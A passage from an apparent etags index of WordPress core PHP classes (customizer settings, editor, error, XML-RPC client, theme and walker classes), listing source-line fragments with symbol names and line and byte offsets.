	public $manager;manager11,137
	public $id;id12,155
	public $priority       = 10;priority13,168
	public $priority       = 10;priority13,168
	public $capability     = 'edit_theme_options';capability14,198
	public $capability     = 'edit_theme_options';capability14,198
	public $theme_supports = '';theme_supports15,246
	public $theme_supports = '';theme_supports15,246
	public $title          = '';title16,276
	public $title          = '';title16,276
	public $description    = '';description17,306
	public $description    = '';description17,306
	public $controls;controls18,336
	function __construct( $manager, $id, $args = array() ) {__construct28,503
	function __construct( $manager, $id, $args = array() ) {args28,503
		$keys = array_keys( get_class_vars( __CLASS__ ) );keys29,561
		$this->manager = $manager;manager35,715
		$this->id = $id;id36,744
		$this->controls = array(); // Users cannot customize the $controls array.controls38,764
	public final function check_capabilities() {check_capabilities50,1066
	public final function maybe_render() {maybe_render65,1463
	protected function render() {render81,1740

wordpress/wp-includes/class-wp-customize-setting.php,4842
class WP_Customize_Setting {WP_Customize_Setting10,108
	public $manager;manager11,137
	public $id;id12,155
	public $type            = 'theme_mod';type14,169
	public $type            = 'theme_mod';type14,169
	public $capability      = 'edit_theme_options';capability15,209
	public $capability      = 'edit_theme_options';capability15,209
	public $theme_supports  = '';theme_supports16,258
	public $theme_supports  = '';theme_supports16,258
	public $default         = '';default17,289
	public $default         = '';default17,289
	public $transport       = 'refresh';transport18,320
	public $transport       = 'refresh';transport18,320
	public $sanitize_callback    = '';sanitize_callback20,359
	public $sanitize_callback    = '';sanitize_callback20,359
	public $sanitize_js_callback = '';sanitize_js_callback21,395
	public $sanitize_js_callback = '';sanitize_js_callback21,395
	protected $id_data = array();id_data23,432
	protected $id_data = array();id_data23,432
	private $_post_value; // Cached, sanitized $_POST value._post_value24,463
	function __construct( $manager, $id, $args = array() ) {__construct35,726
	function __construct( $manager, $id, $args = array() ) {args35,726
		$keys = array_keys( get_class_vars( __CLASS__ ) );keys36,784
		$this->manager = $manager;manager42,938
		$this->id = $id;id43,967
		$this->id = $this->id_data[ 'base' ];id50,1199
	public function preview() {preview68,1689
	 * Callback function to filter the theme mods and options.to87,2328
	public function _preview_filter( $original ) {_preview_filter94,2482
	public final function save() {save105,2790
		$value = $this->post_value();value106,2822
	public final function post_value( $default = null ) {post_value124,3279
	public final function post_value( $default = null ) {default124,3279
		$result = $this->manager->post_value( $this );result128,3402
			return $this->_post_value = $result;_post_value131,3478
	public function sanitize( $value ) {sanitize144,3733
		$value = stripslashes_deep( $value );value145,3771
	protected function update( $value ) {update157,4077
	protected function _update_theme_mod( $value ) {_update_theme_mod178,4572
		$mods = get_theme_mod( $this->id_data[ 'base' ] );mods184,4795
		$mods = $this->multidimensional_replace( $mods, $this->id_data[ 'keys' ], $value );mods185,4848
	protected function _update_option( $value ) {_update_option198,5210
		$options = get_option( $this->id_data[ 'base' ] );options204,5425
		$options = $this->multidimensional_replace( $options, $this->id_data[ 'keys' ], $value );options205,5478
	public function value() {value217,5797
				$function = 'get_theme_mod';function220,5872
				$function = 'get_option';function223,5935
		$values = $function( $this->id_data[ 'base' ] );values234,6252
	public function js_value() {js_value245,6536
		$value = apply_filters( "customize_sanitize_js_{$this->id}", $this->value(), $this );value246,6566
	public final function check_capabilities() {check_capabilities261,6980
	final protected function multidimensional( &$root, $keys, $create = false ) {multidimensional281,7471
	final protected function multidimensional( &$root, $keys, $create = false ) {create281,7471
			$root = array();root283,7585
		$last = array_pop( $keys );last288,7662
		$node = &$root;node289,7692
			$node = &$node[ $key ];node298,7888
	final protected function multidimensional_replace( $root, $keys, $value ) {multidimensional_replace324,8330
		$result = $this->multidimensional( $root, $keys, true );result330,8549
	final protected function multidimensional_get( $root, $keys, $default = null ) {multidimensional_get348,8988
	final protected function multidimensional_get( $root, $keys, $default = null ) {default348,8988
		$result = $this->multidimensional( $root, $keys );result352,9180
	final protected function multidimensional_isset( $root, $keys ) {multidimensional_isset365,9515
		$result = $this->multidimensional_get( $root, $keys );result366,9582
class WP_Customize_Filter_Setting extends WP_Customize_Setting {WP_Customize_Filter_Setting376,9832
	public function update() {}update377,9897
final class WP_Customize_Header_Image_Setting extends WP_Customize_Setting {WP_Customize_Header_Image_Setting385,10089
	public $id = 'header_image_data';id386,10166
	public $id = 'header_image_data';id386,10166
	public function update( $value ) {update388,10202
			$value = $this->manager->get_setting('header_image')->post_value();value394,10374
final class WP_Customize_Background_Image_Setting extends WP_Customize_Setting {WP_Customize_Background_Image_Setting403,10632
	public $id = 'background_image_thumb';id404,10713
	public $id = 'background_image_thumb';id404,10713
	public function update( $value ) {update406,10754

wordpress/wp-includes/class-wp-editor.php,10317
final class _WP_Editors {_WP_Editors11,234
	public static $mce_locale;mce_locale12,260
	private static $mce_settings = array();mce_settings14,289
	private static $mce_settings = array();mce_settings14,289
	private static $qt_settings = array();qt_settings15,330
	private static $qt_settings = array();qt_settings15,330
	private static $plugins = array();plugins16,370
	private static $plugins = array();plugins16,370
	private static $qt_buttons = array();qt_buttons17,406
	private static $qt_buttons = array();qt_buttons17,406
	private static $ext_plugins;ext_plugins18,445
	private static $baseurl;baseurl19,475
	private static $first_init;first_init20,501
	private static $this_tinymce = false;this_tinymce21,530
	private static $this_tinymce = false;this_tinymce21,530
	private static $this_quicktags = false;this_quicktags22,569
	private static $this_quicktags = false;this_quicktags22,569
	private static $has_tinymce = false;has_tinymce23,610
	private static $has_tinymce = false;has_tinymce23,610
	private static $has_quicktags = false;has_quicktags24,648
	private static $has_quicktags = false;has_quicktags24,648
	private static $has_medialib = false;has_medialib25,688
	private static $has_medialib = false;has_medialib25,688
	private static $editor_buttons_css = true;editor_buttons_css26,727
	private static $editor_buttons_css = true;editor_buttons_css26,727
	private function __construct() {}__construct28,772
	public static function parse_settings($editor_id, $settings) {parse_settings30,808
		$set = wp_parse_args( $settings,  array(set31,872
	public static function editor( $content, $editor_id, $settings = array() ) {editor64,2454
	public static function editor( $content, $editor_id, $settings = array() ) {settings64,2454
		$set = self::parse_settings($editor_id, $settings);set66,2533
		$editor_class = ' class="' . trim( $set['editor_class'] . ' wp-editor-area' ) . '"';editor_class67,2587
		$tabindex = $set['tabindex'] ? ' tabindex="' . (int) $set['tabindex'] . '"' : '';tabindex68,2674
		$rows = ' rows="' . (int) $set['textarea_rows'] . '"';rows69,2758
		$switch_class = 'html-active';switch_class70,2815
		$toolbar = $buttons = '';toolbar71,2848
			$switch_class = 'html-active';switch_class77,3013
				$switch_class = 'tmce-active';switch_class83,3216
		$the_editor = apply_filters('the_editor', '<div id="wp-' . $editor_id . '-editor-container" class="wp-editor-container"><textarea' . $editor_class . $rows . $tabindex . ' cols="40" name="' . $set['textarea_name'] . '" id="' . $editor_id . '">%s</textarea></div>');the_editor117,4394
		$content = apply_filters('the_editor_content', $content);content118,4661
	public static function editor_settings($editor_id, $set) {editor_settings126,4826
		$first_run = false;first_run128,4918
			$qtInit = array(qtInit142,5368
				$qtInit = array_merge($qtInit, $set['quicktags']);qtInit148,5477
			$qtInit = apply_filters('quicktags_settings', $qtInit, $editor_id);qtInit156,5726
				self::$mce_locale = $mce_locale = ( '' == get_locale() ) ? 'en' : strtolower( substr(get_locale(), 0, 2) ); // only ISO 639-1mce_locale166,6057
				$no_captions = (bool) apply_filters( 'disable_captions', '' );no_captions167,6187
				$plugins = array( 'inlinepopups', 'spellchecker', 'tabfocus', 'paste', 'media', 'fullscreen', 'wordpress', 'wpeditimage', 'wpgallery', 'wplink', 'wpdialogs' );plugins168,6254
				$first_run = true;first_run169,6418
				$ext_plugins = '';ext_plugins170,6441
					self::$plugins = $plugins = apply_filters( 'teeny_mce_plugins', array('inlinepopups', 'fullscreen', 'wordpress', 'wplink', 'wpdialogs'), $editor_id );plugins173,6492
					$mce_external_plugins = apply_filters('mce_external_plugins', array());mce_external_plugins182,7180
						When this filter is not used, the function will try to load {mce_locale}.js.will192,7666
						$mce_external_languages = apply_filters('mce_external_languages', array());mce_external_languages195,7812
						$loaded_langs = array();loaded_langs197,7895
						$strings = '';strings198,7926
							foreach ( $mce_external_languages as $name => $path ) {name201,7996
						foreach ( $mce_external_plugins as $name => $url ) {name210,8249
							if ( is_ssl() ) $url = str_replace('http://', 'https://', $url);url212,8309
							$plugurl = dirname($url);plugurl216,8416
							$strings = $str1 = $str2 = '';strings217,8449
								$path = str_replace( content_url(), '', $plugurl );path219,8536
								$path = WP_CONTENT_DIR . $path . '/langs/';path220,8596
									$path = trailingslashit( realpath($path) );path223,8692
										$str1 = @file_get_contents($path . 'en.js');str1233,9116
										$str2 = @file_get_contents($path . 'en_dlg.js');str2238,9329
					$plugins = array_unique( apply_filters('tiny_mce_plugins', $plugins) );plugins252,9811
				$mce_spellchecker_languages = __( 'English=en,Danish=da,Dutch=nl,Finnish=fi,French=fr,German=de,Italian=it,Polish=pl,Portuguese=pt,Spanish=es,Swedish=sv' );mce_spellchecker_languages267,10433
				$mce_spellchecker_languages = apply_filters( 'mce_spellchecker_languages', '+' . $mce_spellchecker_languages );mce_spellchecker_languages274,10957
					$mce_css = array();mce_css328,13417
					$editor_styles = array_unique($editor_styles);editor_styles329,13442
					$style_uri = get_stylesheet_directory_uri();style_uri330,13494
					$style_dir = get_stylesheet_directory();style_dir331,13544
						$template_uri = get_template_directory_uri();template_uri334,13622
						$template_dir = get_template_directory();template_dir335,13674
						foreach ( $editor_styles as $key => $file ) {key337,13723
					$mce_css = implode( ',', $mce_css );mce_css349,14053
					$mce_css = '';mce_css351,14108
				$mce_css = trim( apply_filters( 'mce_css', $mce_css ), ' ,' );mce_css354,14135
				$mce_buttons = apply_filters( 'teeny_mce_buttons', array('bold', 'italic', 'underline', 'blockquote', 'separator', 'strikethrough', 'bullist', 'numlist', 'justifyleft', 'justifycenter', 'justifyright', 'undo', 'redo', 'link', 'unlink', 'fullscreen'), $editor_id );mce_buttons361,14314
				$mce_buttons_2 = $mce_buttons_3 = $mce_buttons_4 = array();mce_buttons_2362,14583
				$mce_buttons = apply_filters('mce_buttons', array('bold', 'italic', 'strikethrough', '|', 'bullist', 'numlist', 'blockquote', '|', 'justifyleft', 'justifycenter', 'justifyright', '|', 'link', 'unlink', 'wp_more', '|', 'spellchecker', 'fullscreen', 'wp_adv' ), $editor_id);mce_buttons364,14659
				$mce_buttons_2 = apply_filters('mce_buttons_2', array( 'formatselect', 'underline', 'justifyfull', 'forecolor', '|', 'pastetext', 'pasteword', 'removeformat', '|', 'charmap', '|', 'outdent', 'indent', '|', 'undo', 'redo', 'wp_help' ), $editor_id);mce_buttons_2365,14936
				$mce_buttons_3 = apply_filters('mce_buttons_3', array(), $editor_id);mce_buttons_3366,15188
				$mce_buttons_4 = apply_filters('mce_buttons_4', array(), $editor_id);mce_buttons_4367,15262
			$body_class = $editor_id;body_class370,15342
			$mceInit = array (mceInit392,16169
				$mceInit = array_merge(self::$first_init, $mceInit);mceInit405,16681
				$mceInit = array_merge($mceInit, $set['tinymce']);mceInit408,16775
				$mceInit = apply_filters('teeny_mce_before_init', $mceInit, $editor_id);mceInit415,17258
				$mceInit = apply_filters('tiny_mce_before_init', $mceInit, $editor_id);mceInit417,17347
	private static function _parse_init($init) {_parse_init429,17747
		$options = '';options430,17793
		foreach ( $init as $k => $v ) {k432,17811
				$val = $v ? 'true' : 'false';val434,17869
	public static function enqueue_scripts() {enqueue_scripts447,18288
	public static function editor_js() {editor_js471,18957
		$version = 'ver=' . $tinymce_version;version481,19468
		$tmce_on = !empty(self::$mce_settings);tmce_on482,19508
		$compressed = $compress_scripts && $concatenate_scripts && isset($_SERVER['HTTP_ACCEPT_ENCODING'])compressed487,19620
		$mceInit = $qtInit = '';mceInit493,19906
			foreach ( self::$mce_settings as $editor_id => $init ) {editor_id495,19953
				$options = self::_parse_init( $init );options496,20013
			$mceInit = '{' . trim($mceInit, ',') . '}';mceInit499,20105
			$mceInit = '{}';mceInit501,20163
			foreach ( self::$qt_settings as $editor_id => $init ) {editor_id505,20226
				$options = self::_parse_init( $init );options506,20285
			$qtInit = '{' . trim($qtInit, ',') . '}';qtInit509,20376
			$qtInit = '{}';qtInit511,20432
		$ref = array(ref514,20456
		$suffix = ( defined('SCRIPT_DEBUG') && SCRIPT_DEBUG ) ? '_src' : '';suffix520,20587
			load_ext : function(url,lang){var sl=tinymce.ScriptLoader;sl.markDone(url+'/langs/'+lang+'.js');sl.markDone(url+'/langs/'+lang+'_dlg.js');}load_ext533,21017
		$baseurl = self::$baseurl;baseurl538,21183
	public static function wp_fullscreen_html() {wp_fullscreen_html612,23704
		$width = isset($content_width) && 800 > $content_width ? $content_width : 800;width615,23784
		$width = $width + 22; // compensate for the padding and borderwidth616,23865
		$dfw_width = get_user_setting( 'dfw_width', $width );dfw_width617,23930
		$save = isset($post->post_status) && $post->post_status == 'publish' ? __('Update') : __('Save');save618,23986
		$buttons = array(buttons634,24822
		$buttons = apply_filters( 'wp_fullscreen_buttons', $buttons );buttons651,26081
		foreach ( $buttons as $button => $args ) {button653,26147
	public static function wp_link_query( $args = array() ) {wp_link_query709,28225
	public static function wp_link_query( $args = array() ) {args709,28225
		$pts = get_post_types( array( 'public' => true ), 'objects' );pts710,28284
		$pt_names = array_keys( $pts );pt_names711,28349
		$query = array(query713,28384
		$get_posts = new WP_Query;get_posts732,28916
		$posts = $get_posts->query( $query );posts733,28945
		$results = array();results739,29093
				$info = mysql2date( __( 'Y/m/d' ), $post->post_date );info742,29184
				$info = $pts[ $post->post_type ]->labels->singular_name;info744,29251
	public static function wp_link_dialog() {wp_link_dialog762,29598
		<?php $show_internal = '1' == get_user_setting( 'wplink', '0' ); ?>show_internal780,30372

wordpress/wp-includes/class-wp-error.php,1672
 * Contains the WP_Error class and the is_wp_error() function.and5,37
 * WP_Error and use {@link is_wp_error()} to check if this class is returned.is14,237
 * Many core WordPress functions pass this class in the event of an error andin15,315
class WP_Error {WP_Error21,493
	var $errors = array();errors29,607
	var $errors = array();errors29,607
	var $error_data = array();error_data38,743
	var $error_data = array();error_data38,743
	function __construct($code = '', $message = '', $data = '') {__construct57,1271
	function __construct($code = '', $message = '', $data = '') {message57,1271
	function get_error_codes() {get_error_codes75,1608
	function get_error_code() {get_error_code90,1879
		$codes = $this->get_error_codes();codes91,1908
	function get_error_messages($code = '') {get_error_messages107,2287
			$all_messages = array();all_messages110,2401
			foreach ( (array) $this->errors as $code => $messages )code111,2429
				$all_messages = array_merge($all_messages, $messages);all_messages112,2488
	function get_error_message($code = '') {get_error_message134,2963
			$code = $this->get_error_code();code136,3027
		$messages = $this->get_error_messages($code);messages137,3063
	function get_error_data($code = '') {get_error_data151,3341
			$code = $this->get_error_code();code153,3402
	function add($code, $message, $data = '') {add170,3774
	function add($code, $message, $data = '') {data170,3774
	function add_data($data, $code = '') {add_data186,4116
	function add_data($data, $code = '') {code186,4116
			$code = $this->get_error_code();code188,4178
function is_wp_error($thing) {is_wp_error206,4636

wordpress/wp-includes/class-wp-http-ixr-client.php,2023
class WP_HTTP_IXR_Client extends IXR_Client {WP_HTTP_IXR_Client9,80
	function __construct($server, $path = false, $port = false, $timeout = 15) {__construct11,127
	function __construct($server, $path = false, $port = false, $timeout = 15) {path11,127
			$bits = parse_url($server);bits14,270
			$this->scheme = $bits['scheme'];scheme15,301
			$this->server = $bits['host'];server16,337
			$this->port = isset($bits['port']) ? $bits['port'] : $port;port17,371
			$this->path = !empty($bits['path']) ? $bits['path'] : '/';path18,434
				$this->path = '/';path22,563
			$this->scheme = 'http';scheme24,597
			$this->server = $server;server25,624
			$this->path = $path;path26,652
			$this->port = $port;port27,676
		$this->useragent = 'The Incutio XML-RPC PHP Library';useragent29,704
		$this->timeout = $timeout;timeout30,760
	function query() {query33,793
		$args = func_get_args();args34,813
		$method = array_shift($args);method35,840
		$request = new IXR_Request($method, $args);request36,872
		$xml = $request->getXml();xml37,918
		$port = $this->port ? ":$this->port" : '';port39,948
		$url = $this->scheme . '://' . $this->server . $port . $this->path;url40,993
		$args = array(args41,1063
		foreach ( $this->headers as $header => $value )header48,1240
		$response = wp_remote_post($url, $args);response58,1531
			$errno    = $response->get_error_code();errno61,1609
			$errorstr = $response->get_error_message();errorstr62,1653
			$this->error = new IXR_Error(-32300, "transport error: $errno $errorstr");error63,1700
			$this->error = new IXR_Error(-32301, 'transport error - HTTP status code was not 200 (' . wp_remote_retrieve_response_code( $response ) . ')');error68,1864
		$this->message = new IXR_Message( wp_remote_retrieve_body( $response ) );message76,2205
			$this->error = new IXR_Error(-32700, 'parse error. not well formed');error79,2334
			$this->error = new IXR_Error($this->message->faultCode, $this->message->faultString);error85,2508

wordpress/wp-includes/class-wp-theme.php,12636
final class WP_Theme implements ArrayAccess {WP_Theme9,79
	private static $file_headers = array(file_headers18,220
	private static $file_headers = array(file_headers18,220
	private static $default_themes = array(default_themes39,691
	private static $default_themes = array(default_themes39,691
	private $theme_root;theme_root52,1003
	private $headers = array();headers60,1124
	private $headers = array();headers60,1124
	private $headers_sanitized;headers_sanitized68,1274
	private $name_translated;name_translated75,1455
	private $errors;errors83,1587
	private $stylesheet;stylesheet94,1864
	private $template;template105,2146
	private $parent;parent113,2286
	private $theme_root_uri;theme_root_uri121,2426
	private $textdomain_loaded;textdomain_loaded129,2556
	 * Stores an md5 hash of the theme root, to function as the cache key.as132,2591
	private $cache_hash;cache_hash137,2708
	private static $persistently_cache;persistently_cache147,2938
	private static $cache_expiration = 1800;cache_expiration157,3144
	private static $cache_expiration = 1800;cache_expiration157,3144
	public function __construct( $theme_dir, $theme_root, $_child = null ) {__construct166,3463
	public function __construct( $theme_dir, $theme_root, $_child = null ) {_child166,3463
		$this->theme_root = $theme_root;theme_root181,4016
		$this->stylesheet = $theme_dir;stylesheet182,4051
			$this->stylesheet = basename( $this->theme_root ) . '/' . $this->stylesheet;stylesheet186,4365
			$this->theme_root = dirname( $theme_root );theme_root187,4445
		$this->cache_hash = md5( $this->theme_root . '/' . $this->stylesheet );cache_hash190,4497
		$theme_file = $this->stylesheet . '/style.css';theme_file191,4571
		$cache = $this->cache_get( 'theme' );cache193,4622
				$theme_root_template = $cache['theme_root_template'];theme_root_template203,4919
				$this->errors = new WP_Error( 'theme_not_found', __( 'The theme directory does not exist.' ) );errors207,5167
				$this->errors = new WP_Error( 'theme_no_stylesheet', __( 'Stylesheet is missing.' ) );errors209,5275
			$this->template = $this->stylesheet;template210,5366
			$this->errors = new WP_Error( 'theme_stylesheet_not_readable', __( 'Stylesheet is not readable.' ) );errors217,5926
			$this->template = $this->stylesheet;template218,6031
			$this->headers = get_file_data( $this->theme_root . '/' . $theme_file, self::$file_headers, 'theme' );headers222,6256
			if ( $default_theme_slug = array_search( $this->headers['Name'], self::$default_themes ) ) {default_theme_slug225,6507
		if ( ! $this->template && ! ( $this->template = $this->headers['Template'] ) ) {template232,6816
			$this->template = $this->stylesheet;template233,6899
				$this->errors = new WP_Error( 'theme_no_index', __( 'Template is missing.' ) );errors235,7027
			$parent_dir = dirname( $this->stylesheet );parent_dir245,7674
				$this->template = $parent_dir . '/' . $this->template;template247,7847
			} elseif ( ( $directories = search_theme_directories() ) && isset( $directories[ $this->template ] ) ) {directories248,7906
				$theme_root_template = $directories[ $this->template ]['theme_root'];theme_root_template251,8193
				$this->errors = new WP_Error( 'theme_no_parent', sprintf( __( 'The parent theme is missing. Please install the "%s" parent theme.' ), $this->template ) );errors254,8311
					$this->errors = new WP_Error( 'theme_parent_invalid', sprintf( __( 'The "%s" theme is not a valid parent theme.' ), $this->template ) );errors269,9408
			$this->parent = new WP_Theme( $this->template, isset( $theme_root_template ) ? $theme_root_template : $this->theme_root, $this );parent275,9841
			$cache = array( 'headers' => $this->headers, 'errors' => $this->errors, 'stylesheet' => $this->stylesheet, 'template' => $this->template );cache280,10070
	public function __toString() {__toString293,10630
	public function __isset( $offset ) {__isset300,10802
		static $properties = array(properties301,10840
		static $properties = array(properties301,10840
	public function __get( $offset ) {__get312,11204
	public function offsetSet( $offset, $value ) {}offsetSet351,12383
	public function offsetUnset( $offset ) {}offsetUnset356,12522
	public function offsetExists( $offset ) {offsetExists361,12655
		static $keys = array(keys362,12698
		static $keys = array(keys362,12698
	public function offsetGet( $offset ) {offsetGet381,13548
	public function errors() {errors434,15067
	public function exists() {exists449,15440
	public function parent() {parent461,15762
	private function cache_add( $key, $data ) {cache_add477,16177
	private function cache_get( $key ) {cache_get492,16605
	public function cache_delete() {cache_delete502,16800
		$this->template = $this->textdomain_loaded = $this->theme_root_uri = $this->parent = $this->errors = $this->headers_sanitized = $this->name_translated = null;template505,16980
		$this->headers = array();headers506,17141
	public function get( $header ) {get527,17947
			$this->headers_sanitized = $this->cache_get( 'headers' );headers_sanitized532,18092
				$this->headers_sanitized = array();headers_sanitized534,18202
	public function display( $header, $markup = true, $translate = true ) {display563,19351
	public function display( $header, $markup = true, $translate = true ) {markup563,19351
		$value = $this->get( $header );value564,19424
			$translate = false;translate567,19532
			$value = $this->translate_header( $header, $value );value570,19576
			$value = $this->markup_header( $header, $value, $translate );value573,19650
	private function sanitize_header( $header, $value ) {sanitize_header584,19935
					$value = 'publish';value588,20054
				static $header_tags = array(header_tags593,20145
				static $header_tags = array(header_tags593,20145
				$value = wp_kses( $value, $header_tags );value600,20345
				static $header_tags_with_a = array(header_tags_with_a605,20534
				static $header_tags_with_a = array(header_tags_with_a605,20534
				$value = wp_kses( $value, $header_tags_with_a );value613,20801
				$value = esc_url_raw( $value );value617,20908
				$value = array_filter( array_map( 'trim', explode( ',', strip_tags( $value ) ) ) );value620,20972
	private function markup_header( $header, $value, $translate ) {markup_header638,21440
					$value = $this->get_stylesheet();value642,21572
				$value = wptexturize( $value );value645,21646
					static $attr = null;attr649,21749
					static $attr = null;attr649,21749
						$attr = esc_attr__( 'Visit author homepage' );attr651,21804
					$value = sprintf( '<a href="%1$s" title="%2$s">%3$s</a>', $this->display( 'AuthorURI', true, $translate ), $attr, $value );value652,21857
					$value = __( 'Anonymous' );value654,22014
				static $comma = null;comma658,22081
				static $comma = null;comma658,22081
					$comma = __( ', ' );comma661,22220
				$value = implode( $comma, $value );value663,22252
				$value = esc_url( $value );value667,22346
	private function translate_header( $header, $value ) {translate_header684,22693
				$this->name_translated = translate( $value, $this->get('TextDomain' ) );name_translated690,22903
				static $tags_list;tags_list696,23129
					$tags_list = array();tags_list698,23187
					$feature_list = get_theme_feature_list( false ); // No APIfeature_list699,23214
						$tag = $tags_list[ $tag ];tag706,23426
				$value = translate( $value, $this->get('TextDomain') );value712,23509
	public function get_stylesheet() {get_stylesheet728,23907
	public function get_template() {get_template743,24289
	public function get_stylesheet_directory() {get_stylesheet_directory758,24662
	public function get_template_directory() {get_template_directory776,25184
			$theme_root = $this->parent()->theme_root;theme_root778,25253
			$theme_root = $this->theme_root;theme_root780,25306
	public function get_stylesheet_directory_uri() {get_stylesheet_directory_uri796,25672
	public function get_template_directory_uri() {get_template_directory_uri811,26109
			$theme_root_uri = $this->parent()->get_theme_root_uri();theme_root_uri813,26182
			$theme_root_uri = $this->get_theme_root_uri();theme_root_uri815,26249
	public function get_theme_root() {get_theme_root830,26606
	public function get_theme_root_uri() {get_theme_root_uri848,27094
			$this->theme_root_uri = get_theme_root_uri( $this->stylesheet, $this->theme_root );theme_root_uri850,27176
	public function get_screenshot( $uri = 'uri' ) {get_screenshot868,27840
	public function get_screenshot( $uri = 'uri' ) {uri868,27840
		$screenshot = $this->cache_get( 'screenshot' );screenshot869,27890
	public function get_files( $type = null, $depth = 0, $search_parent = false ) {get_files903,29101
	public function get_files( $type = null, $depth = 0, $search_parent = false ) {type903,29101
		$files = (array) self::scandir( $this->get_stylesheet_directory(), $type, $depth );files904,29182
	public function get_page_templates() {get_page_templates920,29622
		$page_templates = $this->cache_get( 'page_templates' );page_templates925,29890
			$page_templates = array();page_templates928,29990
			$files = (array) $this->get_files( 'php', 1 );files930,30021
			foreach ( $files as $file => $full_path ) {file932,30072
				$page_template = $this->translate_header( 'Template Name', $page_template );page_template943,30456
	 * 	for the found files, particularly when this function recurses to lower depths.recurses963,31145
	private static function scandir( $path, $extensions = null, $depth = 0, $relative_path = '' ) {scandir965,31234
	private static function scandir( $path, $extensions = null, $depth = 0, $relative_path = '' ) {extensions965,31234
			$extensions = (array) $extensions;extensions970,31399
			$_extensions = implode( '|', $extensions );_extensions971,31437
		$relative_path = trailingslashit( $relative_path );relative_path974,31489
			$relative_path = '';relative_path976,31574
		$results = scandir( $path );results978,31599
		$files = array();files979,31630
				$found = self::scandir( $path . '/' . $result, $extensions, $depth - 1 , $relative_path . $result );found987,31828
				$files = array_merge_recursive( $files, $found );files988,31933
	public function load_textdomain() {load_textdomain1009,32622
		$textdomain = $this->get('TextDomain');textdomain1013,32739
			$this->textdomain_loaded = false;textdomain_loaded1015,32806
			$this->textdomain_loaded = true;textdomain_loaded1020,32912
		$path = $this->get_stylesheet_directory();path1024,32969
		if ( $domainpath = $this->get('DomainPath') )domainpath1025,33014
		$this->textdomain_loaded = load_theme_textdomain( $textdomain, $path );textdomain_loaded1030,33121
	public function is_allowed( $check = 'both', $blog_id = null ) {is_allowed1045,33685
	public function is_allowed( $check = 'both', $blog_id = null ) {check1045,33685
			$allowed = self::get_allowed_on_network();allowed1050,33845
			$allowed = self::get_allowed_on_site( $blog_id );allowed1056,34018
	public static function get_allowed( $blog_id = null ) {get_allowed1073,34409
	public static function get_allowed( $blog_id = null ) {blog_id1073,34409
		$network = (array) apply_filters( 'allowed_themes', self::get_allowed_on_network() );network1074,34466
	public static function get_allowed_on_network() {get_allowed_on_network1086,34788
		static $allowed_themes;allowed_themes1087,34839
			$allowed_themes = (array) get_site_option( 'allowedthemes' );allowed_themes1089,34901
	public static function get_allowed_on_site( $blog_id = null ) {get_allowed_on_site1102,35224
	public static function get_allowed_on_site( $blog_id = null ) {blog_id1102,35224
		static $allowed_themes = array();allowed_themes1103,35289
		static $allowed_themes = array();allowed_themes1103,35289
			$blog_id = get_current_blog_id();blog_id1106,35346
		$current = $blog_id == get_current_blog_id();current1111,35470
				$converted = array();converted1129,36195
				$themes = wp_get_themes();themes1130,36221
				foreach ( $themes as $stylesheet => $theme_data ) {stylesheet1131,36252
	public static function sort_by_name( &$themes ) {sort_by_name1158,37027
	 * Callback function for usort() to naturally sort themes by name.for1167,37268
	 * Accesses the Name header directly from the class for maximum speed.for1169,37340
	private static function _name_sort( $a, $b ) {_name_sort1175,37542
	private static function _name_sort_i18n( $a, $b ) {_name_sort_i18n1185,37747

wordpress/wp-includes/class-wp-walker.php,5252
 * A class for displaying various tree-like structures.for3,10
 * Extend the Walker class to use it, see examples at the below. Child classesto5,69
class Walker {Walker15,497
	 * What the class handles.handles17,517
	var $tree_type;tree_type23,606
	var $db_fields;db_fields32,714
	var $max_pages = 1;max_pages41,849
	var $max_pages = 1;max_pages41,849
	 * additional values that may be used with the child class methods. Thismethods47,1009
	function start_lvl( &$output, $depth = 0, $args = array() ) {}start_lvl55,1263
	function start_lvl( &$output, $depth = 0, $args = array() ) {}depth55,1263
	 * additional values that may be used with the child class methods. Thismethods61,1466
	function end_lvl( &$output, $depth = 0, $args = array() )   {}end_lvl69,1733
	function end_lvl( &$output, $depth = 0, $args = array() )   {}depth69,1733
	 * additional values that may be used with the child class methods. Includesmethods75,1915
	function start_el( &$output, $object, $depth, $args, $current_object_id = 0 )  {}start_el83,2148
	function start_el( &$output, $object, $depth, $args, $current_object_id = 0 )  {}current_object_id83,2148
	 * additional values that may be used with the child class methods.methods89,2359
	function end_el( &$output, $object, $depth = 0, $args = array() )    {}end_el96,2554
	function end_el( &$output, $object, $depth = 0, $args = array() )    {}depth96,2554
	function display_element( $element, &$children_elements, $max_depth, $depth=0, $args, &$output ) {display_element118,3466
	function display_element( $element, &$children_elements, $max_depth, $depth=0, $args, &$output ) {depth118,3466
		$id_field = $this->db_fields['id'];id_field123,3598
		$cb_args = array_merge( array(&$output, $element, $depth), $args);cb_args128,3774
		$id = $element->$id_field;id131,3905
					$newlevel = true;newlevel139,4192
					$cb_args = array_merge( array(&$output, $depth), $args);cb_args141,4248
			$cb_args = array_merge( array(&$output, $depth), $args);cb_args151,4597
		$cb_args = array_merge( array(&$output, $element, $depth), $args);cb_args156,4744
	 * It is a generic function which does not assume any existing order ofwhich163,4931
	function walk( $elements, $max_depth) {walk174,5274
		$args = array_slice(func_get_args(), 2);args176,5316
		$output = '';output177,5359
		$id_field = $this->db_fields['id'];id_field185,5501
		$parent_field = $this->db_fields['parent'];parent_field186,5539
			$empty_array = array();empty_array190,5632
		$top_level_elements = array();top_level_elements202,6039
		$children_elements  = array();children_elements203,6072
			$first = array_slice( $elements, 0, 1 );first217,6419
			$root = $first[0];root218,6463
			$top_level_elements = array();top_level_elements220,6486
			$children_elements  = array();children_elements221,6520
		if ( ( $max_depth == 0 ) && count( $children_elements ) > 0 ) {max_depth237,7027
			$empty_array = array();empty_array238,7093
 	 * and number of elements per page, this function first determines all top level root elementsfirst251,7451
 	 * @param int $max_depth = 0 means display all levels; $max_depth > 0 specifies the number of display levels.max_depth256,7687
	function paged_walk( $elements, $max_depth, $page_num, $per_page ) {paged_walk260,7928
		$args = array_slice( func_get_args(), 4 );args266,8080
		$output = '';output267,8125
		$id_field = $this->db_fields['id'];id_field269,8142
		$parent_field = $this->db_fields['parent'];parent_field270,8180
		$count = -1;count272,8227
			$total_top = count( $elements );total_top274,8268
			$paging = false;paging277,8363
			$start = 0;start278,8383
				$end = $total_top;end280,8425
			$this->max_pages = 1;max_pages281,8448
			$paging = true;paging283,8484
			$start = ( (int)$page_num - 1 ) * (int)$per_page;start284,8503
			$end   = $start + $per_page;end285,8556
				$this->max_pages = ceil($total_top / $per_page);max_pages287,8615
				$elements = array_reverse( $elements );elements293,8769
				$oldstart = $start;oldstart294,8813
				$start = $total_top - $end;start295,8837
				$end = $total_top - $oldstart;end296,8869
